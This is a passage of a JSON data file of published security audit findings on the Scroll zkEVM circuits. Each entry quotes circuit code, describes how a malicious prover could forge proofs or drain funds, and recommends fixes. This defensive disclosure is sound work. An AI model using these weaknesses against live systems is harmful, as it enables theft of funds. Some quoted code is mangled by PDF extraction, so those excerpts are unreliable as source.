        ]
    },
    {
        "title": "5. N_BYTES parameters are not checked to prevent overow ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The ConstantDivisionGadget and LtGadget circuits implement operations on multi-byte integers: division by a constant value and comparison, respectively. Each circuit has a generic parameter N_BYTES representing the number of bytes used. However, each of these circuits has additional implied restrictions on N_BYTES required to prevent unexpected behavior due to overowing eld elements. In ConstantDivisionGadget (shown in gure 5.1), the quotient value is constrained to _ 256 , but the expression quotient.expr() * denominator.expr() be less than may overow if denominator is suciently large (e.g., if denominator is 1024 and N_BYTES is 31. The comment highlighted in gure 5.2 provides sucient conditions to prevent overow, but these are not fully enforced either in the circuit or in assertions at circuit construction time. let quotient = cb.query_cell_with_type(CellType::storage_for_expr(&numerator)); let remainder = cb.query_cell_with_type(CellType::storage_for_expr(&numerator)); // Require that remainder < denominator cb.range_lookup(remainder.expr(), denominator); // Require that quotient < 256**N_BYTES // so we can't have any overflow when doing `quotient * denominator`. let quotient_range_check = RangeCheckGadget::construct(cb, quotient.expr()); // Check if the division was done correctly cb.require_equal( \"numerator - remainder == quotient  denominator\", numerator - remainder.expr(), quotient.expr() * denominator.expr(), ); Figure 5.1: zkevm-circuits/src/evm_circuit/util/math_gadget/constant_division.rs#33 /// Returns (quotient: numerator/denominator, remainder: numerator%denominator), /// with `numerator` an expression and `denominator` a constant. /// Input requirements: /// - `quotient < 256**N_BYTES` /// - `quotient * denominator < field size` /// - `remainder < denominator` requires a range lookup table for `denominator` #[derive(Clone, Debug)] pub struct ConstantDivisionGadget<F, const N_BYTES: usize> { Figure 5.2: zkevm-circuits/src/evm_circuit/util/math_gadget/constant_division.rs#13 20 In LtGadget (shown in gure 5.3), values of N_BYTES above 31 will cause lt to be an unconstrained Boolean, since a malicious prover can set diff to the representation of (rhs - lhs) even if rhs < lhs. The comment highlighted in gure 5.4 describes sucient conditions to prevent overow without changes to the circuit, but these restrictions are enforced only by a debug_assert! in from_bytes::expr (shown in gure 5.5). let lt = cb.query_bool(); let diff = cb.query_bytes(); let range = pow_of_two(N_BYTES * 8); // The equation we require to hold: `lhs - rhs == diff - (lt * range)`. cb.require_equal( \"lhs - rhs == diff - (lt  range)\", lhs - rhs, from_bytes::expr(&diff) - (lt.expr() * range), ); Figure 5.3: zkevm-circuits/src/evm_circuit/util/math_gadget/lt.rs#3746 /// Returns `1` when `lhs < rhs`, and returns `0` otherwise. /// lhs and rhs `< 256**N_BYTES` /// `N_BYTES` is required to be `<= MAX_N_BYTES_INTEGER` to prevent overflow: /// values are stored in a single field element and two of these are added /// together. /// The equation that is enforced is `lhs - rhs == diff - (lt * range)`. /// Because all values are `<= 256**N_BYTES` and `lt` is boolean, `lt` can only /// be `1` when `lhs < rhs`. #[derive(Clone, Debug)] pub struct LtGadget<F, const N_BYTES: usize> { Figure 5.4: zkevm-circuits/src/evm_circuit/util/math_gadget/lt.rs#1423 pub(crate) fn expr<F: FieldExt, E: Expr<F>>(bytes: &[E]) -> Expression<F> { debug_assert!( bytes.len() <= MAX_N_BYTES_INTEGER, \"Too many bytes to compose an integer in field\" ); Figure 5.5: zkevm-circuits/src/evm_circuit/util.rs#528532 Exploit Scenario A developer who is unaware of these issues uses the ConstantDivisionGadget or LtGadget circuit with values of N_BYTES that are too large, causing potentially underconstrained circuits. Recommendations Short term, add explicit checks at circuit construction time to ensure that N_BYTES is limited to values that prevent overow. Long term, consider performing these validations at compile time with static_assertions or asserts in a const context. 6. Di\u0000erences in shared code between zkevm-circuits and halo2-lib Severity: Medium Diculty: High Type: Data Validation Finding ID: TOB-SCROLL-6 Target: Several les",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "7. Underconstrained warm status on CALL opcodes allows gas cost forgery ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "An underconstrained variable in the CallOpGadget allows an attacker to prove the execution of a transaction with incorrect gas costs by setting an address as cold when it should become warm. The CallOpGadget implements the CALL, CALLCODE, DELEGATECALL, and STATICCALL EVM opcodes. The gas cost of these opcodes depends on whether the callee address is warm. Additionally, the implementation of these opcodes must make the address warm so that future calls to the same address cost less gas. However, the variable that controls the addresss new warm status is not constrained and is referenced only in the write to the RW table: // Add callee to access list let is_warm = cb.query_bool(); let is_warm_prev = cb.query_bool(); cb.account_access_list_write( tx_id.expr(), call_gadget.callee_address_expr(), is_warm.expr(), is_warm_prev.expr(), Some(&mut reversion_info), ); Figure 7.1: zkevm-circuits/src/evm_circuit/execution/callop.rs#L129-L138 This means that a malicious prover can make the is_warm variable equal false, causing a called address to actually become cold during the execution of a CALL, instead of warm as in the EVM specication. A constraint on the RW table, requiring that the initial value of the access list elements is always false, prevents another possible scenario where the is_warm_prev value could be dened as warm even though the address had not been accessed before. Exploit Scenario A malicious prover generates a proof of execution for a transaction involving two CALL opcodes to the same address that results in dierent gas costs from the EVM specication: in the rst CALL opcode execution, the prover sets the address as cold instead of warm, causing the wrong gas calculation for the second call. The prover submits that proof, the results of which will not match the correct EVM semantics, leading to state divergence and loss of funds. Recommendations Short term, add constraints to ensure that the callee address becomes warm on the CALL opcodes, by constraining is_warm to be true.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. RW table constants must match exactly when the verication key is created ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "Nearly all runtime state of EVM program execution is tracked and validated in a lookup table referred to as the RW table. This table enforces correct initialization and coherency of read and write operations for addressable parts of the state, including the stack, memory, and account storage, as well as inputs and outputs such as the transaction access list and the transaction log. Figure 8.1 shows the storage types combined in this table: pub enum RwTableTag { /// Start (used for padding) Start = 1, /// Stack operation Stack, /// Memory operation Memory, /// Account Storage operation AccountStorage, /// Tx Access List Account operation TxAccessListAccount, /// Tx Access List Account Storage operation TxAccessListAccountStorage, /// Tx Refund operation TxRefund, /// Account operation Account, /// Call Context operation CallContext, /// Tx Log operation TxLog, /// Tx Receipt operation TxReceipt, } Figure 8.1: zkevm-circuits/src/table.rs#354377 The zkEVM circuit enforces correct memory operation results for EVM opcodes by performing lookups into this table, as shown in gure 8.2. Calls such as memory_lookup are translated into Lookup::Rw values (shown in gure 8.3), which are then further translated into multi-column lookups into the RW table, as illustrated in gure 8.4. Note that in lookups, the rst column, corresponding to the xed column q_enable, is always set to 1. cb.condition(is_mstore8.expr(), |cb| { cb.memory_lookup( 1.expr(), from_bytes::expr(&address.cells), value.cells[0].expr(), None, ); }); Rw { Figure 8.2: A memory lookup (zkevm-circuits/src/evm_circuit/execution/memory.rs#7380) /// Counter for how much read-write have been done, which stands for /// the sequential timestamp. counter: Expression<F>, /// A boolean value to specify if the access record is a read or write. is_write: Expression<F>, /// Tag to specify which read-write data to access, see RwTableTag for /// all tags. tag: Expression<F>, /// Values corresponding to the tag. values: RwValues<F>, }, Figure 8.3: Lookup::Rw (zkevm-circuits/src/evm_circuit/table.rs#197208) Self::Rw { counter, is_write, tag, values, } => { vec![ 1.expr(), counter.clone(), is_write.clone(), tag.clone(), values.id.clone(), values.address.clone(), values.field_tag.clone(), values.storage_key.clone(), values.value.clone(), values.value_prev.clone(), values.aux1.clone(), values.aux2.clone(), ] } Figure 8.4: Conversion to lookup columns, with q_enable highlighted (zkevm-circuits/src/evm_circuit/table.rs#321341) However, these lookups enforce only the existence of such rows, and for correct execution, it is vital that the reads and writes present in the table are the following:  Coherent with the external state: The rst read of any data is correctly initialized, and the last write of externally visible data (e.g., storage) is reected in the Ethereum state commitment.  Coherent with each other: Values in read operations match the most recent written value or the initial value.  Coherent with the execution trace: Every entry in the RW table corresponds to exactly one memory-access-generating step in the execution trace. Equivalently, there are no extra entries in the table. These global constraints on the RW table are enforced through three major checks. First, the RW table is lexicographically ordered with respect to its columns. Several constraints are used to enforce lexicographic ordering. An illustrative example is shown in gure 8.5. Note that the constraint is conditional on the xed column selector. All other lexicographic ordering constraints are also conditional on this xed column, so any rows where selector == 0 are not required to be ordered. meta.create_gate(\"limb_difference is not zero\", |meta| { let selector = meta.query_fixed(selector, Rotation::cur()); let limb_difference = meta.query_advice(limb_difference, Rotation::cur()); let limb_difference_inverse = meta.query_advice(limb_difference_inverse, Rotation::cur()); vec![selector * (1.expr() - limb_difference * limb_difference_inverse)] }); Figure 8.5: A lexicographic ordering constraint (zkevm-circuits/src/state_circuit/lexicographic_ordering.rs#128134) Second, a large collection of structural properties on the sorted table are enforced. Figures 8.6 and 8.7 show examples of such constraints. When the rows are sorted, all operations involving the same address or storage identier are grouped together, sorted in increasing order by the nal two columns, which represent the value rw_counter in big-endian. Note that increasing values of rw_counter are treated as happening later in time, as shown in the highlighted portion of gure 8.6, which enforces that reads do not change the value by requiring that value == value_prev in read entries. Unlike in other parts of the table, the constraints applied to Start rows (illustrated in gure 8.7) use the rw_counter elds for a dierent purpose. Every Start row where lexicographic_ordering_selector == 1 is required to exactly increase rw_counter by 1. Start rows do not represent memory operations, and thus can be thought of as padding. // When all the keys in the current row and previous row are equal. self.condition(q.not_first_access.clone(), |cb| { cb.require_zero( \"non-first access reads don't change value\", q.is_read() * (q.rw_table.value.clone() - q.rw_table.value_prev.clone()), ); cb.require_zero( \"initial value doesn't change in an access group\", q.initial_value.clone() - q.initial_value_prev(), ); }); Figure 8.6: A structural constraint on the RW table (zkevm-circuits/src/state_circuit/constraint_builder.rs#177187) self.require_zero(\"field_tag is 0 for Start\", q.field_tag()); self.require_zero(\"address is 0 for Start\", q.rw_table.address.clone()); self.require_zero(\"id is 0 for Start\", q.id()); self.require_zero(\"storage_key is 0 for Start\", q.rw_table.storage_key.clone()); // 1.1. rw_counter increases by 1 for every non-first row self.require_zero( \"rw_counter increases by 1 for every non-first row\", q.lexicographic_ordering_selector.clone() * (q.rw_counter_change() - 1.expr()), ); Figure 8.7: Some constraints applied to Start rows (zkevm-circuits/src/state_circuit/constraint_builder.rs#192200) Third, a running count of RW lookups is tracked in the rw_counter eld of StepState (shown in gure 8.8) for each step. When execution reaches the EndBlock state, two additional lookups are performed, shown in gure 8.9. These lookups ensure that there are max_rws - step.rw_counter padding rows in the RW table, and are designed to check that there are at most step.rw_counter non-padding rows in the table. pub(crate) struct StepState<F> { /// The execution state selector for the step pub(crate) execution_state: DynamicSelectorHalf<F>, /// The Read/Write counter pub(crate) rw_counter: Cell<F>, Figure 8.8: StepState and its rw_counter eld (zkevm-circuits/src/evm_circuit/step.rs#456460) // 3. Verify rw_counter counts to the same number of meaningful rows in // rw_table to ensure there is no malicious insertion. // Verify that there are at most total_rws meaningful entries in the rw_table cb.rw_table_start_lookup(1.expr()); cb.rw_table_start_lookup(max_rws.expr() - total_rws.expr()); // Since every lookup done in the EVM circuit must succeed and uses // a unique rw_counter, we know that at least there are // total_rws meaningful entries in the rw_table. // We conclude that the number of meaningful entries in the rw_table // is total_rws. Figure 8.9: Constraints ensuring that the RW table has been padded to max_rws rows (zkevm-circuits/src/evm_circuit/execution/end_block.rs#7887) These checks are sucient to guarantee RW table correctness, assuming the following: 1. The rw_counter eld of StepState correctly tracks how many distinct, non-Start RW lookups are performed in the execution trace. 2. lexicographic_ordering_selector == 1 whenever rw_table.q_enable == 1. 3. rw_table.q_enable is a sequence of all 1s followed by all 0s. 4. There are at most max_rws rows where rw_table.q_enable == 1. If any of these requirements is false, a malicious prover can prove erroneous execution traces by manipulating the RW table in some way: 1. 2. 3. 4. If the rw_counter overcounts the number of distinct RW lookups, a row representing a malicious memory write can be inserted. If lexicographic_ordering_selector == 0 in any cell where rw_table.q_enable == 1, the prover may bypass nearly all structural property checks by partitioning the RW table into two versions, one starting at the beginning of the table and one starting at that unrestricted row. If rw_table.q_enable is 1, then 0, then 1, the middle row will not correspond to any RW lookup, and thus may be set to a malicious memory write. If rw_table.q_enable is 1 for more than than max_rws rows, a malicious memory write can be inserted. These four assumptions are all properties of xed rows, constants, or the circuit itself, so they do not need to be constrained in the circuit. However, they are not currently explicitly enforced at circuit-construction time, so if any of them is violated when generating the zkEVM verication key, this will go undetected and would lead to global circuit unsoundness. Unfortunately, the rst is equivalent to there are no rw_counter-related bugs in the EVM circuit, so it is dicult to enforce. However, the relationships between lexicographic_ordering_selector, rw_table.q_enable, and max_rws can and should be checked automatically with assertions. Exploit Scenario An incorrect version of the zkEVM circuit is used to generate a verication key that fails to enforce one of the assumptions above. A malicious prover then crafts an RW table that leads to incorrect execution of a transaction, causing state divergence and potential loss of funds. Recommendations Short term, add assert!(...) calls to enforce correct correspondence between rw_table.q_enable, lexicographic_ordering_selector, and max_rws. Long term, review and document assumptions made about all circuit constants. When possible, use techniques such as assertions to check these assumptions at circuit-construction time.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "9. The CREATE and CREATE2 opcodes can be called within a static context ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The CREATE and CREATE2 opcodes are missing a constraint that prevents them from being called in the context of a static call. This allows for a state-changing operation that is not allowed by the EVM specication. In the context of a STATICCALL, the state cannot be modied. As a result, state-changing opcodes like CREATE, CREATE2, LOGX, SSTORE, and CALL are forbidden when the argument value diers from 0, according to the EVM specication. However, the current implementation of the CREATE and CREATE2 opcodes does not have a check to ensure that the calling context has permission to change the state. By contrast, the other implementations of state-changing opcodes have the following check: // constrain not in static call let is_static = cb.call_context(None, CallContextFieldTag::IsStatic); cb.require_zero(\"is_static is false\", is_static.expr()); Figure 9.1: zkevm-circuits/src/evm_circuit/execution/sstore.rs#L57-L59 Without this validation in place, a malicious prover could generate a proof of execution for a transaction involving the CREATE opcode within the context of a STATICCALL, leading to state divergence. Note that the SELFDESTRUCT opcode is disabled, but is also subject to the non-static constraint according to the Ethereum Yellow Paper. This should be taken into account if the opcode is implemented in the future. Exploit Scenario Alice deploys a constant-function automated market maker (AMM) smart contract AliceMM to the Scroll zkEVM. In each AMM transaction, AliceMM receives funds in token type A (or B), then calculates the exchange rate, then sends funds in token type B (or A). To calculate the exchange rate, AliceMM calls Bobs ComplicatedMath contract. Alice knows about reentrancy attacks and is careful to call ComplicatedMath only with STATICCALL. However, Bob has deployed a malicious version of ComplicatedMath that uses CREATE to call AliceMM in a reentrant fashion. Bob calls AliceMM with a malicious transaction that manipulates the exchange rate, then drains the contract of token A in exchange for a tiny amount of token B, resulting in loss of funds. Recommendations Short term, add the constraint to validate that the execution context does not allow state-changing operations. Long term, add tests for the CREATE, CREATE2, LOGX, SSTORE, and CALL opcodes when called within a STATICCALL.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "10. ResponsibleOpcode table incorrectly handles CREATE and CREATE2 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The ResponsibleOpcode table is used to attribute dierent execution states to particular sets of opcodes. For many opcodes, this table is the primary source of truth for which state they transition to. The SameContextGadget (shown in gure 10.1) enforces that executing opcodes correctly use the corresponding state. For example, it enforces that the ADD opcode uses the ADD_SUB state. cb.add_lookup( \"Responsible opcode lookup\", Lookup::Fixed { tag: FixedTableTag::ResponsibleOpcode.expr(), values: [ cb.execution_state().as_u64().expr(), opcode.expr(), 0.expr(), ], }, ); Figure 10.1: zkevm-circuits/src/evm_circuit/util/common_gadget.rs#4858 This table is populated via the ExecutionState::responsible_opcodes method, which also is used for reporting execution statistics. This method does not handle the CREATE2 state, and incorrectly reports both CREATE and CREATE2 as the responsible opcodes for the CREATE state, as shown in gure 10.2: Self::CREATE => vec![OpcodeId::CREATE, OpcodeId::CREATE2], Figure 10.2: zkevm-circuits/src/evm_circuit/step.rs#304 Since the CREATE and CREATE2 opcodes constrain the execution state in a way that does not use SameContextGadget, this does not cause any soundness issues. However, if a similar error were made for another opcode or state in the table, the resulting circuit may be either incomplete or underconstrained. Recommendations Short term, x the data in this table by correctly mapping the CREATE and CREATE2 states to the CREATE and CREATE2 opcodes, respectively. Long term, develop tests to check the consistency of the opcode table against the execution behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "11. Elliptic curve parameters omitted from Fiat-Shamir ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The Fiat-Shamir code in the snark-verifier patch does not incorporate the elliptic curve parameters into the transcript. Points are incorporated into the transcript using only the x and y coordinates, with no reference to the associated curve, and we are not able to nd any instances where the curve parameters are explicitly added to a Fiat-Shamir transcript. fn common_ec_point(&mut self, ec_point: &C) -> Result<(), Error> { let coordinates = Option::<Coordinates<C>>::from(ec_point.coordinates()).ok_or_else(|| { Error::Transcript( io::ErrorKind::Other, \"Cannot write points at infinity to the transcript\".to_string(), ) })?; [coordinates.x(), coordinates.y()].map(|coordinate| { self.buf.extend(coordinate.to_repr().as_ref().iter().rev().cloned()); }); Ok(()) } Figure 11.1: snark-verifier/src/system/halo2/transcript/evm.rs#L173-L187 Non-interactive proofs must commit exactly to the statement being proven before any challenges are generated. If a prover can equivocate about attributes of the statement (e.g., which elliptic curve the points are supposed to be on), a proof for one statement may be passed o as a proof for another, as in the Frozen Heart class of vulnerabilities. (Note that the Frozen Heart PlonK vulnerability discussed in the linked article is not under consideration here; it is only an illustration of Fiat-Shamir vulnerabilities.) The snark-verifier code is intended to be curve-agnostic, so a proof generated using one curve may be veried using a dierent elliptic curve that shares only the points present in the transcript, leading to identical challenge values but a dierent statement. In general, two dierent elliptic curves can share only a limited number of points, so the existing code may implicitly commit to the curve being used. However, we have not determined the exact threshold, and a detailed security proof should be done if that property is relied upon. In the Scroll zkEVM system, the prover and verier use a xed set of curve parameters, so it is not possible to convince Scroll software to accept a proof using another curve. Recommendations Short term, include the curve parameters at the beginning of the Fiat-Shamir transcript. Long term, always consider including all public parameters of the system in the Fiat-Shamir transformations.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "12. The gas cost for the CALL opcode is underconstrained ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The gas cost of the CALL-like opcodes (CALL, CALLCODE, DELEGATECALL, and STATICCALL) is not constrained, allowing a malicious prover to spend as much gas as desired in certain conditions. This allows free gas CALL operations if the prover sets this value to zero, or it can cause the transaction execution to terminate after the execution of the current opcode by dening a high gas cost. Both options could cause a state divergence from an execution following the EVM specication. Figure 12.1 shows the code that gets the witness cell step_gas_cost and then uses it unconstrained to set the gas cost of the current opcode. This happens when the call precheck conditions are valid (i.e., the call depth is valid, and the caller balance is enough to transfer the call value), and the called address has no associated code: let step_gas_cost = cb.query_cell(); let memory_expansion = call_gadget.memory_expansion.clone(); cb.condition( and::expr([ no_callee_code.expr(), not::expr(is_precompile.expr()), is_precheck_ok.expr(), ]), |cb| { // Save caller's call state for field_tag in [ CallContextFieldTag::LastCalleeId, CallContextFieldTag::LastCalleeReturnDataOffset, CallContextFieldTag::LastCalleeReturnDataLength, cb.call_context_lookup(true.expr(), None, field_tag, 0.expr()); ] { } }, ); cb.condition( and::expr([is_precompile.expr(), is_precheck_ok.expr()]), |cb| { // Save caller's call state for (field_tag, value) in [ (CallContextFieldTag::LastCalleeId, callee_call_id.expr()), (CallContextFieldTag::LastCalleeReturnDataOffset, 0.expr()), ( CallContextFieldTag::LastCalleeReturnDataLength, return_data_len.expr(), ), ] { } cb.call_context_lookup(true.expr(), None, field_tag, value); }, ); cb.condition( and::expr([call_gadget.is_empty_code_hash.expr(), is_precheck_ok.expr()]), |cb| { // For CALLCODE opcode, it has an extra stack pop `value` and one account read current // for caller balance (+2). // // For DELEGATECALL opcode, it has two extra call context lookups for // caller address and value (+2). // // No extra lookups for STATICCALL opcode. let transfer_rwc_delta = is_call.expr() * not::expr(transfer.value_is_zero.expr()) * 2.expr(); let rw_counter_delta = 21.expr() + is_call.expr() * 1.expr() + transfer_rwc_delta.clone() + is_callcode.expr() + is_delegatecall.expr() * 2.expr() + precompile_memory_writes; cb.require_step_state_transition(StepStateTransition { rw_counter: Delta(rw_counter_delta), program_counter: Delta(1.expr()), stack_pointer: Delta(stack_pointer_delta.expr()), gas_left: Delta(-step_gas_cost.expr()), Figure 12.1: zkevm-circuits/src/evm_circuit/execution/callop.rs#L255-L314 Exploit Scenario A malicious prover generates and submits a proof of execution for a transaction involving a CALL to an address with empty code that would normally exhaust the transactions gas. By dening the gas cost as zero, the transaction succeeds. However, this execution does not match the correct EVM semantics, leading to state divergence and loss of funds. Recommendations Short term, add constraints to correctly compute the gas cost for the call opcodes. Long term, add negative tests ensuring that EVM traces gas costs do not satisfy the circuit constraints.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "13. Unconstrained opcodes allow nondeterministic execution ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "Several opcodes are missing constraints that ensure the correct correspondence between execution state and opcode, allowing a malicious prover to hijack the transaction execution. The Scroll zkEVM circuit checks the correct execution of a transaction by verifying a prover-generated execution trace. This execution trace consists of a series of states, each represented by a constructor of the ExecutionState enum. Each state corresponds to an execution gadget in the circuit, which checks preconditions and enforces correct updates to EVM data structures such as memory and storage. In the Scroll codebase, the correspondence between the execution state and opcode is enforced entirely by these gadgets. Most execution gadgets use a SameContextGadget (shown in gure 13.1) to check that the current (execution state, opcode) pair appears in the ResponsibleOpcode table. Execution gadgets that do not use SameContextGadget must check that the current opcode is correct for the current state through other means. For example, ErrorOOGSloadSstoreGadget, shown in gure 13.2, uses a PairSelectGadget to enforce that, when the execution state is ErrorOutOfGasSloadSstore, the opcode must be either SSTORE or SLOAD. cb.add_lookup( \"Responsible opcode lookup\", Lookup::Fixed { tag: FixedTableTag::ResponsibleOpcode.expr(), values: [ cb.execution_state().as_u64().expr(), opcode.expr(), 0.expr(), ], }, ); Figure 13.1: zkevm-circuits/src/evm_circuit/util/common_gadget.rs#48 impl<F: Field> ExecutionGadget<F> for ErrorOOGSloadSstoreGadget<F> { const NAME: &'static str = \"ErrorOutOfGasSloadSstore\"; const EXECUTION_STATE: ExecutionState = ExecutionState::ErrorOutOfGasSloadSstore; fn configure(cb: &mut ConstraintBuilder<F>) -> Self { let opcode = cb.query_cell(); let is_sstore = PairSelectGadget::construct( cb, opcode.expr(), OpcodeId::SSTORE.expr(), OpcodeId::SLOAD.expr(), ); Figure 13.2: zkevm-circuits/src/evm_circuit/execution/error_oog_sload_sstore.rs#4861 Because checking the opcode/state correspondence is the responsibility of each execution gadget, if any execution gadget fails to properly constrain the opcode, a malicious prover can replace another execution step with that gadgets execution state. In the simplest case, this can lead to state divergence, but, in general, a malicious prover may have a large amount of control over the resulting state. For example, the ReturnRevertGadget, shown in gure 13.3, does not enforce that the opcode is either RETURN or REVERT. A malicious prover can replace any execution state with a RETURN_REVERT state, causing the execution to halt at an arbitrary point, and potentially returning data depending on the values currently on the stack and in memory. If the transaction creates a contract, a malicious prover can replace the code being deployed with values available in memory at other points in the init codes execution. impl<F: Field> ExecutionGadget<F> for ReturnRevertGadget<F> { const NAME: &'static str = \"RETURN_REVERT\"; const EXECUTION_STATE: ExecutionState = ExecutionState::RETURN_REVERT; fn configure(cb: &mut ConstraintBuilder<F>) -> Self { let opcode = cb.query_cell(); cb.opcode_lookup(opcode.expr(), 1.expr()); let offset = cb.query_cell_phase2(); let length = cb.query_word_rlc(); cb.stack_pop(offset.expr()); cb.stack_pop(length.expr()); let range = MemoryAddressGadget::construct(cb, offset, length); let is_success = cb.call_context(None, CallContextFieldTag::IsSuccess); cb.require_boolean(\"is_success is boolean\", is_success.expr()); // cb.require_equal( // \"if is_success, opcode is RETURN. if not, opcode is REVERT\", // opcode.expr(), // is_success.expr() * OpcodeId::RETURN.expr() // + not::expr(is_success.expr()) * OpcodeId::REVERT.expr(), // ); Figure 13.3: zkevm-circuits/src/evm_circuit/execution/return_revert.rs#5577 In total, we found four gadgets that do not constrain the opcode to match the current execution state:  ErrorCodeStoreGadget (execution/error_code_store.rs#4187)  ErrorPrecompileFailedGadget (execution/error_precompile_failed.rs#3885)  Additionally, the ErrorPrecompileFailedGadget fails to check that the called address is a precompile contract and is missing a correct transition enforcement using the CommonErrorGadget.  ErrorInvalidCreationCodeGadget (execution/error_invalid_creation_code.rs#L35-L73)  ReturnRevertGadget (execution/return_revert.rs#L60-L293) Exploit Scenario Suppose a bridge between two blockchains uses the Scroll zkEVM to bridge assets between them. Alice crafts a transaction which, when an opcode such as an ADD is instead executed as a RETURN, will erroneously withdraw funds from the bridge. She generates a malicious execution trace and submits a zkEVM proof to the bridge, which allows her to drain the bridge of funds. Recommendations Short term, add the missing opcode checks to ErrorCodeStoreGadget, ErrorPrecompileFailedGadget, ErrorInvalidCreationCodeGadget, and ReturnRevertGadget. Long term, consider redesigning the way that opcodes map to states. The current design means that any execution gadget that fails to constrain the opcode will cause nondeterministic execution. If, instead, each execution gadget has an enable input, and the EVM circuit deterministically selects which gadget(s) have enable == 1, an underconstrained execution gadget can aect only the behavior of opcodes that are supposed to use that gadget.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. Nondeterministic execution of ReturnDataCopyGadget and ErrorReturnDataOutOfBoundGadget ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The gadget that implements the successful execution of the RETURNDATACOPY opcode is underconstrained, allowing a malicious prover to successfully execute the opcode when it is in an error condition for particular opcode inputs. This allows the prover to cause state divergence from a correct EVM execution. Figure 14.1 shows the error gadget implementation that constrains the trace to have at least one true error condition for the RETURNDATACOPY opcode. These constraints check overow conditions on the stack values and their sum. // Check if `data_offset` is Uint64 overflow. let data_offset_larger_u64 = sum::expr(&data_offset.cells[N_BYTES_U64..]); let is_data_offset_within_u64 = IsZeroGadget::construct(cb, data_offset_larger_u64); // Check if `remainder_end` is Uint64 overflow. let sum = AddWordsGadget::construct(cb, [data_offset, size], remainder_end.clone()); let is_end_u256_overflow = sum.carry().as_ref().unwrap(); let remainder_end_larger_u64 = sum::expr(&remainder_end.cells[N_BYTES_U64..]); let is_remainder_end_within_u64 = IsZeroGadget::construct(cb, remainder_end_larger_u64); // check if `remainder_end` exceeds return data length. let is_remainder_end_exceed_len = LtGadget::construct( cb, return_data_length.expr(), from_bytes::expr(&remainder_end.cells[..N_BYTES_U64]), ); // Need to check if `data_offset + size` is U256 overflow via `AddWordsGadget` carry. If // yes, it should be also an error of return data out of bound. cb.require_equal( \"Any of [data_offset > u64::MAX, data_offset + size > U256::MAX, remainder_end > u64::MAX, remainder_end > return_data_length] occurs\", or::expr([ // data_offset > u64::MAX not::expr(is_data_offset_within_u64.expr()), // data_offset + size > U256::MAX is_end_u256_overflow.expr(), // remainder_end > u64::MAX not::expr(is_remainder_end_within_u64.expr()), // remainder_end > return_data_length is_remainder_end_exceed_len.expr(), ]), 1.expr(), ); Figure 14.1: evm_circuit/execution/error_return_data_oo_bound.rs#L68-L101 On the successful execution path, these conditions are not checked to be false. In fact, if data_offset = WORD_CELL_MAX, size = 0, and return_data_size < 232, the ReturnDataCopyGadget constraints are satised. This case is an error state because data_offset is larger than u64::MAX. // 3. contraints for copy: copy overflow check // i.e., offset + size <= return_data_size let in_bound_check = RangeCheckGadget::construct( cb, return_data_size.expr() - (from_bytes::expr(&data_offset.cells) + from_bytes::expr(&size.cells)), ); // 4. memory copy // Construct memory address in the destination (memory) to which we copy memory. let dst_memory_addr = MemoryAddressGadget::construct(cb, dest_offset, size); // Calculate the next memory size and the gas cost for this memory // access. This also accounts for the dynamic gas required to copy bytes to // memory. let memory_expansion = MemoryExpansionGadget::construct(cb, [dst_memory_addr.address()]); let memory_copier_gas = MemoryCopierGasGadget::construct( cb, dst_memory_addr.length(), memory_expansion.gas_cost(), ); let copy_rwc_inc = cb.query_cell(); cb.condition(dst_memory_addr.has_length(), |cb| { cb.copy_table_lookup( last_callee_id.expr(), CopyDataType::Memory.expr(), cb.curr.state.call_id.expr(), CopyDataType::Memory.expr(), return_data_offset.expr() + from_bytes::expr(&data_offset.cells), return_data_offset.expr() + return_data_size.expr(), dst_memory_addr.offset(), dst_memory_addr.length(), 0.expr(), // for RETURNDATACOPY rlc_acc is 0 copy_rwc_inc.expr(), ); }); cb.condition(not::expr(dst_memory_addr.has_length()), |cb| { cb.require_zero( \"if no bytes to copy, copy table rwc inc == 0\", copy_rwc_inc.expr(), ); }); Figure 14.2: evm_circuit/execution/returndatacopy.rs#L99-L141 In sum, the prover could decide whether the execution would correctly halt with the ErrorReturnDataOutOfBoundGadget error or if it would successfully execute the RETURNDATACOPY opcode. Exploit Scenario A malicious prover generates and submits a proof of execution for a transaction involving a RETURNDATACOPY with particular arguments. Due to the missing validations on the successful execution state, the prover could choose to successfully execute the opcode, or halt the execution, leading to state divergence and loss of funds. Recommendations Short term, add constraints to ensure that the successful execution state is disjoint from the error execution state. Long term, investigate other error states and their associated opcode implementations to guarantee that their execution state is disjoint and cannot be chosen by a malicious prover.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Many RW counter updates are magic numbers ",
